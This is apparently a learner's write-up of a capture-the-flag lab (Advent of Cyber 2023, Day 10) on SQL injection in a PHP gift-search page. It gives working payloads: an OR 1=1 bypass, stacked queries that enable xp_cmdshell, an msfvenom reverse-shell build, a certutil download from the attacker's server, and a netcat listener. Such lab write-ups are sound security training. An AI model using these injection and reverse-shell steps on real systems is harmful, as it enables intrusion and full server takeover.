@@ -1,0 +1,165 @@
+#AOC2023
+#DAY10
+#ROOM: Injects the hallswith EXEC Queries
+
+#STORY : The Best Festival Company started receiving many reports that their company website, bestfestival.
+
+, is displaying some concerning information about the state of Christmas this year! After looking into the matter, Santa's Security Operations Center (SSOC) confirmed that the company website has been hijacked and ultimately defaced, causing significant reputational damage. To make matters worse, the web development team has been locked out of the web server as the user credentials have been changed. With no other way to revert the changes, Elf Exploit McRed has been tasked with attempting to hack back into the server to regain access.
+
+After conducting some initial research, Elf Forensic McBlue came across a forum post made on the popular black hat hacking internet forum, JingleHax. The post, made earlier in the month, explains that the poster is auctioning off several active vulnerabilities related to Best Festival Company systems:
+
+A screenshot of a forum post on a site called JingleHax. The author of the post has the username: Gr33dster. The post reads: Hello JingleHax Forums! As the merger of Best Festival Company approaches, I find myself in possession of knowledge that's as good as gold. I've decided to auction off these vulnerabilities to the highest bidder. The stakes are high, and the potential rewards are even higher. If you've got the skills and resources to make use of this information, you're in for a serious payday. I won't reveal all the details here, but I can confirm that these vulnerabilities are both zero-days and known issues that Best Festival Company hasn't addressed. The treasure includes potential entry points, data access, and even the possibility of exposing classified information. To bid, reply to this thread with your offer. I'll provide a secure channel for the winning bidder to transfer payment.
+
+This forum post surely explains the havoc that has gone on over the past week. Armed with this knowledge, Elf Exploit McRed began testing the company website from the outside to find the vulnerable components that led to the server compromise. As a result of McRed's thorough investigation, the team now suspects a possible SQL injection vulnerability.
+
+#OBJECTVES : 
+  1.Learn to understand and identify SQL injection vulnerabilities
+  2.Exploit stacked queries to turn SQL injection into remote code execution
+  3.Help Elf McRed restore the Best Festival website and save its reputation!
+  
+
+#PHP
+
+PHP is a server-side scripting language, meaning the code is executed on the web server before the final HTML is sent to the user's browser. Unlike client-side technologies like HTML, CSS, and JavaScript, PHP allows developers to perform various server-side tasks, such as connecting to a wide range of databases (such as MySQL, PostgreSQL, and Microsoft SQL Server), executing SQL queries, processing form data, and dynamically generating web content.
+
+The most common way for PHP to connect to SQL databases is using the PHP Data Objects (PDO) extension or specific database server drivers like mysqli for MySQL or sqlsrv for Microsoft SQL Server (MSSQL). The connection is typically established by providing parameters such as the host, username, password, and database name.
+
+After establishing a database connection, we can execute SQL queries through PHP and dynamically generate HTML content based on the returned data to display information such as user profiles, product listings, or blog articles.If we want our PHP script to fetch information regarding any green-coloured ornaments, we could use the following lines:
+
+// Execute an SQL query
+$query = "SELECT * FROM tbl_ornaments WHERE colour = 'Green'";
+$result = sqlsrv_query($conn, $query);  
+
+In the above snippet, we first save our SQL query into a variable named $query. This query instructs the database to retrieve all rows from the tbl_ornaments table where the "colour" column is set to "Green". We then use the sqlsrv_query() function to execute this query by passing it to a database connection object ($conn).
+
+You can think of the $result variable as a container that holds the outcome of the SQL query, allowing you to iterate through the rows and access the data within those rows. Later in the script, you can use this result object to fetch and display data, making it a crucial part of the process when working with databases in PHP.
+
+#User Input
+
+While the ability to execute SQL queries in PHP allows us to interact with our database, the real power of database-driven web applications lies in making these queries dynamic.This is done by allowing the retrieve and website create website content depending on what the user wants specified in their User inputs. 
+
+One common way to take in user-supplied data in web applications is through GET parameters. These parameters are typically appended to the URL and can be accessed by PHP. They allow users to specify their search criteria or input, making it a valuable tool for interactive web applications.
+
+For example instead of hard coding the color we would mdify the code as following:
+
+// Retrieve the GET parameter and save it as a variable
+$colour = $_GET['colour'];
+
+// Execute an SQL query with the user-supplied variable
+$query = "SELECT * FROM tbl_ornaments WHERE colour = '$colour'";
+$result = sqlsrv_query($conn, $query);
+
+#SQL Injection (SQLi)
+
+Taking in user-supplied input gives us powerful ways to create dynamic content, but failing to secure this input correctly can expose a critical vulnerability known as SQL injection (SQLi). SQL injection is an attack technique that exploits how web applications handle user input, particularly in SQL queries. Instead of providing legitimate input (like the ornament colour in the example above), the attacker injects malicious SQL statements into a web application's input fields or parameters. The application's database server then executes this rogue SQL query.
+
+SQL injection vulnerabilities pose a considerable risk to web applications as they can lead to unauthorised access, data theft, data manipulation, or even the complete compromise of a web application and its underlying database through remote code execution.
+
+
+#Testing for SQL Injection
+
+Testing for SQL injection is a critical aspect of web application security assessment. It involves probing the application to identify vulnerabilities where an attacker can manipulate user-supplied input to execute unauthorised queries.
+
+From here, visited http://10.49.158.131 in the web browser. 
+
+INSTRUCTION: Navigating the website as an end-user to understand its functionality and offerings is a great place to start. This manual enumeration allows us to identify the areas in the application where user input is accepted and used in SQL queries. This can include search fields, login forms, and any input fields that interact with a database. You may need to navigate to the correct page containing the vulnerable component, so be sure to click on any buttons or links you find.
+
+Browse the website manually until you find a form that accepts user input and might be querying a database. After locating the Gift Search feature, we can confirm our suspicions by simply filling out the form with the expected values
+
+After clicking search website redirect to another page with a URL with interesting parameters:
+
+http://10.49.158.131/giftresults.php?age=child&interests=toys&budget=30
+
+From this we can deduce that the underlying PHP code is taking in the three parameters we specified for age, interests, and budget (as separated by the & character) and querying the database to retrieve the filtered results and output them to the page.
+
+#Testing the input fields: Triggering errors
+
+used a special character "'" and refreshed the page to trigger sytanx errors to see if user input goes unsanitazed as it reaches the backend.To do this, alter the age parameter in the URL to include just a single quote (') and hit Enter to load the page: http://10.49.158.131/giftresults.php?age='&interests=toys&budget=30
+
+saw an error returned by the application:
+
+ Database query error: Array ( [0] => Array ( [0] => 42000 [SQLSTATE] => 42000 [1] => 102 [code] => 102 [2] => [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Incorrect syntax near 'gadgets'. [message] => [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Incorrect syntax near 'gadgets'. ) [1] => Array ( [0] => 42000 [SQLSTATE] => 42000 [1] => 105 [code] => 105 [2] => [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Unclosed quotation mark after the character string ''. [message] => [Microsoft][ODBC Driver 17 for SQL Server][SQL Server]Unclosed quotation mark after the character string ''. ) ) 
+ 
+ from this sensitive information is revealed helping us to tailor our craftmanship of further injections. This error message shows that Microsoft Server is the SQL database manager due to the banners and driver information between the square brackets.
+ 
+ 
+ #visualized backend code
+ 
+ Even without see the source code we can visulize what the backend code mught look like:
+ 
+ $age = $_GET['age'];
+$interests = $_GET['interests'];
+$budget = $_GET['budget'];
+
+$sql = "SELECT name FROM gifts WHERE age = '$age' AND interests = '$interests' AND budget <= '$budget'";
+
+$result = sqlsrv_query($conn, $sql);
+
+
+
+#BYpassing the intended filter and avoid errors to retrieve all gift results
+
+Injected the payload " ' OR 1=1 --"  that always evaluates to true to bypass the filter and avoid errors as:
+http://10.49.158.131/giftresults.php?age=adult' OR 1=1 --&interests=gadgets&budget=50
+
+successfully returned all the gifts from database table.
+
+##the first flag was one of the gifts
+
+#Calling STORED PROCEDURES
+
+A stored procedure is a prewritten set of SQL statements stored directly inside a database that can be executed whenever needed.
+These can either be custom or built in.  xp_cmdshell is a Microsoft sql server stored procedure.
+
+#XP_CMDSHELL
+xp_cmdshell is a system-extended stored procedure in Microsoft SQL Server that enables the execution of operating system commands and programs from within Server. It provides a mechanism for Server to interact directly with the host operating system's command shell. While it can be a powerful administrative tool, it can also be a security risk if not used cautiously when enabled.
+
+An attempt to enable xp_cmdshell on the Best Festival Company database by stacking the following commands using the SQL injection we discovered:
+
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+converting the above into stacked sqli becomes:
+
+http://10.48.171.187/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
+
+#Remote Code Execution
+
+used certutil.exe to confirm RCE. 
+certutil.exe is a native Windows command-line program installed as part of Certificate Services. It's handy in engagements because it is a binary signed by Microsoft and allows us to make HTTP/s connections. In our scenario, we can use it to make an HTTP request to download a file from a web server that we control to confirm that the command was executed
+
+#Generate an MSFvenom Payload 
+
+used msfvenom to generate a reverse shell payload
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.200.191 LPORT=4444 -f exe -o reverse.exe
+
+started python server:
+
+ python3 -m http.server 7777 
+ 
+ using the stacked query to call xp_cmdshell and execute the certutil.exe command on the target to download the payload.
+ 
+#downloading the payload:
+ 
+ http://10.48.171.187/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://192.168.200.191:7777/reverse.exe C:\Windows\Temp\reverse.exe'; --
+ 
+ starting a netcat listener
+ 
+ nc -lvnp 4444
+ 
+ #catching the shell
+run one final stacked query to execute the reverse.exe file we previously saved in the C:\Windows\Temp directory:
+
+http://10.48.171.187/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --
+
+
+#getting the flags
+ 
+ after getting the shell, we had admin level priviledge . navigating to C:\User\Administrator\Destop, read the contentsb f note.txt and found flag 2 and after running restore_website.bat and refrshing the homepage of thr website gave  the final third flag
+ 
+ the end
+
+
